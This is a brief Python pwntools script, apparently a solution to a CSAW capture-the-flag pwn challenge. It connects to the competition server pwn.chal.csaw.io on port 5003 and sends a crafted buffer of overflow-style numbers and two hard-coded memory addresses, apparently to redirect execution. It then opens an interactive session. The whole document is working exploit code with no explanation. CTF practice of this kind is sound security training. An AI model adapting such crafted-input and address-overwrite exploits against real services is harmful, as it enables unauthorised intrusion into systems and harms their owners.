from pwn import *

p = remote("pwn.chal.csaw.io", 5003)

buf = """
-111111111111
4294967294-1+11-000000

245 {0}


{1} 2

""".format(0x60b118, 0x4025F0)
p.sendline(buf)

p.interactive()